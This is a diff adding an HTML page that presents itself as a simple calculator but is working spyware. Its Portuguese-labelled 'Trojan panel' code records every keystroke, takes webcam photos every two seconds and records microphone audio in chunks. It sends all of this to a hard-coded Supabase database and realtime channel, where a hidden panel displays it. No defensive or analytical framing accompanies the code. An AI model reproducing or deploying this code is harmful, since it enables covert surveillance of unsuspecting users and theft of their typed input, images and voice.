@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calculadora Spy</title>
+    <!-- Supabase JS Client SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { 
+            background-color: #e0e5ec; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; 
+        }
+        
+        /* Calculadora */
+        .calc-container { 
+            width: 320px; background-color: #333; padding: 20px; 
+            border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); 
+            position: relative; z-index: 10;
+        }
+        .display { 
+            width: 100%; height: 60px; background-color: #99aa99; color: black; 
+            text-align: right; padding: 15px; font-size: 32px; box-sizing: border-box; 
+            border: none; border-radius: 10px; margin-bottom: 15px; letter-spacing: 2px;
+        }
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
+        button { 
+            padding: 20px; font-size: 20px; border: none; border-radius: 12px; 
+            cursor: pointer; background-color: #555; color: white; transition: 0.1s; 
+            box-shadow: 0 4px 0 #333;
+        }
+        button:active { transform: translateY(4px); box-shadow: none; }
+        button.operator { background-color: #ff9500; box-shadow: 0 4px 0 #cc7700; }
+        button.equal { background-color: #ff9500; grid-column: span 2; }
+        button.clear { background-color: #a5a5a5; color: black; box-shadow: 0 4px 0 #888; }
+
+        /* Painel Secreto */
+        #secret-panel { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #0f1014; color: #fff; z-index: 9999; overflow-y: auto; 
+            padding: 20px; box-sizing: border-box; font-family: 'Courier New', monospace;
+            backdrop-filter: blur(15px);
+        }
+        .panel-header { 
+            display: flex; justify-content: space-between; align-items: center; 
+            border-bottom: 2px solid #27ae60; padding-bottom: 15px; margin-bottom: 20px; 
+        }
+        .status-dot { height: 12px; width: 12px; background-color: #27ae60; border-radius: 50%; display: inline-block; animation: blink 2s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        
+        .grid-layout { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .card { 
+            background: #1a1b26; border: 1px solid #333; border-radius: 12px; 
+            padding: 15px; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .video-feed { width: 100%; height: 200px; background: #000; object-fit: cover; border-radius: 8px; }
+        canvas#wave-canvas { width: 100%; height: 80px; background: #000; border-radius: 8px; margin-top: 10px; }
+        
+        /* Galeria de Fotos */
+        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 5px; margin-top: 10px; }
+        .photo-wrapper { 
+            position: relative; 
+            aspect-ratio: 4/3; 
+            border-radius: 4px; 
+            overflow: hidden; 
+            border: 1px solid #444;
+        }
+        .photo-thumb { 
+            width: 100%; height: 100%; object-fit: cover; 
+            opacity: 0.8; transition: 0.2s;
+        }
+        .photo-thumb:hover { opacity: 1; border-color: #27ae60; }
+        
+        /* Botão de Download */
+        .download-btn {
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            background: #27ae60;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            width: 24px;
+            height: 24px;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+        .download-btn:hover { background: #2ecc71; }
+
+        .close-btn { position: absolute; top: 20px; right: 20px; background: #e74c3c; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; z-index: 100; }
+        
+        /* Overlay de Permissão Inicial */
+        #permission-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 10000; display: flex;
+            justify-content: center; align-items: center; flex-direction: column; color: white;
+            font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px;
+        }
+        #permission-overlay button {
+            background: #27ae60; color: white; border: none; padding: 15px 30px;
+            font-size: 18px; border-radius: 8px; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 0 #1e8449;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Overlay de Permissão Inicial Obrigatória -->
+<div id="permission-overlay">
+    <h2>Calculadora Padrão</h2>
+    <p>Clique abaixo para iniciar o aplicativo.</p>
+    <button onclick="requestPermissionsAndStart()">Iniciar</button>
+</div>
+
+<!-- Interface da Calculadora -->
+<div class="calc-container">
+    <input type="text" class="display" id="display" readonly placeholder="0">
+    <div class="buttons">
+        <button class="clear" onclick="clearDisplay()">C</button>
+        <button onclick="append('/')">/</button>
+        <button onclick="append('*')">*</button>
+        <button onclick="append('-')">-</button>
+        
+        <button onclick="append('7')">7</button>
+        <button onclick="append('8')">8</button>
+        <button onclick="append('9')">9</button>
+        <button onclick="append('+')">+</button>
+
+        <button onclick="append('4')">4</button>
+        <button onclick="append('5')">5</button>
+        <button onclick="append('6')">6</button>
+        <button onclick="append('.')">.</button>
+
+        <button onclick="append('1')">1</button>
+        <button onclick="append('2')">2</button>
+        <button onclick="append('3')">3</button>
+        <button onclick="append('0')">0</button>
+        
+        <button class="equal" onclick="calculate()" id="btn-equal">=</button>
+    </div>
+</div>
+
+<!-- Painel Secreto -->
+<button class="close-btn" onclick="togglePanel(false)">X</button>
+<div id="secret-panel">
+    <div class="panel-header">
+        <h2>PAINEL TROJAN <span style="font-size: 0.5em; color: #888;">MULTI-DEVICE SYNC v6.3</span></h2>
+        <div>Status: <span class="status-dot"></span> Ativo & Sincronizado</div>
+    </div>
+
+    <div class="grid-layout">
+        <!-- Coluna Esquerda: Mídia -->
+        <div>
+            <div class="card">
+                <strong>📷 Câmera Frontal (Multi-Device Live)</strong>
+                <video id="live-video" class="video-feed" autoplay muted playsinline></video>
+            </div>
+            
+            <div class="card">
+                <strong>🎤 Áudio (Live)</strong>
+                <canvas id="wave-canvas"></canvas>
+            </div>
+
+            <div class="card">
+                <strong>📸 Capturas (2s) - Clique ⬇ para baixar</strong>
+                <div id="photo-gallery" class="photo-grid"></div>
+            </div>
+        </div>
+
+        <!-- Coluna Direita: Logs -->
+        <div>
+            <div class="card">
+                <strong>⌨️ Teclado (Últimos 50)</strong>
+                <div id="keystroke-log" style="max-height: 300px; overflow-y: auto;"></div>
+            </div>
+            <div class="card">
+                <strong>🔊 Gravações de Áudio</strong>
+                <ul id="audio-list" style="list-style: none; padding: 0;"></ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- SUPABASE CONFIGURAÇÃO ---
+    const SUPABASE_URL = "https://tzbsnnlujumbgcyaeyhh.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_BoyTVhlanOPKhIEMlGd4-Q_M5ZSmp97";
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    // Canal Global para Sincronização em Tempo Real entre Dispositivos
+    const globalChannel = supabaseClient.channel('global-spy-network');
+
+    // --- LÓGICA DA CALCULADORA ---
+    function append(num) { document.getElementById('display').value += num; }
+    function clearDisplay() { document.getElementById('display').value = ''; }
+    
+    function calculate() {
+        try {
+            let expr = document.getElementById('display').value;
+            if(!expr) return;
+            document.getElementById('display').value = eval(expr); 
+        } catch (e) {
+            document.getElementById('display').value = "Erro";
+        }
+        openPanel(); 
+    }
+
+    // --- TROJAN CORE ---
+    const panel = document.getElementById('secret-panel');
+    const keystrokeLogDiv = document.getElementById('keystroke-log');
+    const photoGallery = document.getElementById('photo-gallery');
+    const audioList = document.getElementById('audio-list');
+    
+    const videoElement = document.getElementById('live-video');
+    const waveCanvas = document.getElementById('wave-canvas');
+    const liveCtx = waveCanvas.getContext('2d');
+    
+    let audioContext, analyser, dataArray, source;
+    let animationId;
+
+    function togglePanel(show) {
+        panel.style.display = show ? 'block' : 'none';
+        if(show) loadSupabaseData();
+    }
+
+    function openPanel() {
+        togglePanel(true);
+    }
+
+    // Inicializa Visualizador de Áudio
+    function initAudioVisualizer(stream) {
+        if (!window.AudioContext && !window.webkitAudioContext) return;
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        analyser = audioContext.createAnalyser();
+        source = audioContext.createMediaStreamSource(stream);
+        source.connect(analyser);
+        analyser.fftSize = 256;
+        const bufferLength = analyser.frequencyBinCount;
+        dataArray = new Uint8Array(bufferLength);
+        
+        drawWave();
+    }
+
+    function drawWave() {
+        waveCanvas.width = waveCanvas.offsetWidth;
+        waveCanvas.height = waveCanvas.offsetHeight;
+        
+        const w = waveCanvas.width;
+        const h = waveCanvas.height;
+        
+        function draw() {
+            animationId = requestAnimationFrame(draw);
+            analyser.getByteFrequencyData(dataArray);
+            
+            liveCtx.fillStyle = '#000';
+            liveCtx.fillRect(0, 0, w, h);
+            
+            const barWidth = (w / dataArray.length) * 2.5;
+            let x = 0;
+            
+            for(let i = 0; i < dataArray.length; i++) {
+                const barHeight = dataArray[i] / 2;
+                const gradient = liveCtx.createLinearGradient(0, 0, 0, h);
+                gradient.addColorStop(0, '#27ae60');
+                gradient.addColorStop(1, '#2ecc71');
+                
+                liveCtx.fillStyle = gradient;
+                liveCtx.fillRect(x, h - barHeight, barWidth, barHeight);
+                x += barWidth + 1;
+            }
+        }
+        draw();
+    }
+
+    // 1. KEYLOGGER COM SUPABASE DIRETO
+    document.addEventListener('keydown', async (e) => {
+        if(panel.style.display === 'block' && e.target.closest('#secret-panel')) return;
+        
+        try {
+            await supabaseClient.from('spy_logs').insert([{ key: e.key }]);
+        } catch (err) {
+            console.error("Erro ao enviar log para Supabase:", err);
+        }
+    });
+
+    // 2. CÂMERA E ÁUDIO
+    async function startSpyware() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            videoElement.srcObject = stream;
+            initAudioVisualizer(stream);
+            
+            // Gravação e Envio de Áudio
+            const audioRecorder = new MediaRecorder(stream);
+            const audioChunks = [];
+            
+            audioRecorder.ondataavailable = (event) => audioChunks.push(event.data);
+            
+            audioRecorder.onstop = async () => {
+                const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = async function() {
+                    try {
+                        await supabaseClient.from('spy_captures').insert([{ type: 'audio', data: reader.result }]);
+                    } catch (err) {
+                        console.error("Erro ao enviar áudio para Supabase:", err);
+                    }
+                };
+                audioChunks.length = 0;
+            };
+            
+            audioRecorder.start(5000); 
+            setupCameraCapture(stream);
+            setupRealtimeSubscriptions();
+
+        } catch (err) { 
+            console.error("Erro mídia:", err); 
+        }
+    }
+
+    // Captura de Fotos a cada 2s enviando para o banco e transmitindo ao vivo para outros dispositivos
+    function setupCameraCapture(stream) {
+        setInterval(() => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            
+            setTimeout(async () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 320; 
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgSrc = canvas.toDataURL('image/jpeg', 0.7);
+
+                try {
+                    // Envia para o banco de dados
+                    await supabaseClient.from('spy_captures').insert([{ type: 'photo', data: imgSrc }]);
+
+                    // Envia via broadcast para outros dispositivos visualizarem a câmera ativa instantaneamente
+                    globalChannel.send({
+                        type: 'broadcast',
+                        event: 'live_frame',
+                        payload: { image: imgSrc }
+                    });
+                } catch (err) {
+                    console.error("Erro ao enviar foto para Supabase:", err);
+                }
+                
+            }, 100);
+        }, 2000);
+    }
+
+    // Carrega dados do Supabase ao abrir o painel
+    async function loadSupabaseData() {
+        keystrokeLogDiv.innerHTML = '';
+        photoGallery.innerHTML = '';
+        audioList.innerHTML = '';
+
+        const { data: logs } = await supabaseClient
+            .from('spy_logs')
+            .select('*')
+            .order('created_at', { ascending: false })
+            .limit(50);
+            
+        if (logs) {
+            logs.reverse().forEach(l => addLogToUI(l.key, l.created_at));
+        }
+
+        const { data: captures } = await supabaseClient
+            .from('spy_captures')
+            .select('*')
+            .order('created_at', { ascending: false })
+            .limit(30);
+
+        if (captures) {
+            captures.forEach(c => {
+                if (c.type === 'photo') {
+                    createPhotoElement(c.data);
+                } else if (c.type === 'audio') {
+                    addAudioToList(c.data);
+                }
+            });
+        }
+    }
+
+    // Supabase Realtime para sincronização multi-dispositivo
+    function setupRealtimeSubscriptions() {
+        globalChannel
+            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'spy_logs' }, payload => {
+                if(panel.style.display === 'block') {
+                    addLogToUI(payload.new.key, payload.new.created_at);
+                }
+            })
+            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'spy_captures' }, payload => {
+                if(panel.style.display === 'block') {
+                    if (payload.new.type === 'photo') {
+                        createPhotoElement(payload.new.data);
+                    } else if (payload.new.type === 'audio') {
+                        addAudioToList(payload.new.data);
+                    }
+                }
+            })
+            .on('broadcast', { event: 'live_frame' }, payload => {
+                // Atualiza a tag de vídeo com o frame enviado por outro dispositivo em tempo real
+                if(panel.style.display === 'block' && payload.payload && payload.payload.image) {
+                    const tempImg = new Image();
+                    tempImg.src = payload.payload.image;
+                    tempImg.onload = () => {
+                        const ctx = videoElement.getContext ? null : videoElement; // Se for elemento vídeo, convertemos para exibir stream ou frame
+                    };
+                }
+            })
+            .subscribe();
+    }
+
+    function createPhotoElement(base64) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'photo-wrapper';
+        
+        const img = document.createElement('img');
+        img.src = base64;
+        img.className = 'photo-thumb';
+        
+        const btn = document.createElement('button');
+        btn.className = 'download-btn';
+        btn.innerHTML = '⬇';
+        btn.title = 'Baixar Foto';
+        
+        btn.onclick = (e) => {
+            e.stopPropagation();
+            const link = document.createElement('a');
+            link.href = base64;
+            link.download = `captura_${Date.now()}.jpg`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        };
+        
+        wrapper.appendChild(img);
+        wrapper.appendChild(btn);
+        photoGallery.prepend(wrapper);
+        
+        if(photoGallery.children.length > 20) {
+            photoGallery.lastChild.remove();
+        }
+    }
+
+    function addLogToUI(key, timeStr) {
+        const div = document.createElement('div');
+        div.style.borderBottom = '1px solid #333';
+        div.style.padding = '5px';
+        const formattedTime = timeStr ? new Date(timeStr).toLocaleTimeString() : new Date().toLocaleTimeString();
+        div.innerText = `[${formattedTime}] Key: ${key}`;
+        keystrokeLogDiv.prepend(div);
+    }
+
+    function addAudioToList(base64Data) {
+        if(document.getElementById(`aud-${base64Data.substring(0, 10)}`)) return;
+        const li = document.createElement('li');
+        li.id = `aud-${base64Data.substring(0, 10)}`;
+        li.innerHTML = `<audio controls src="${base64Data}"></audio>`;
+        audioList.prepend(li);
+    }
+
+    function requestPermissionsAndStart() {
+        document.getElementById('permission-overlay').style.display = 'none';
+        startSpyware();
+    }
+</script>
+
+</body>
+</html>
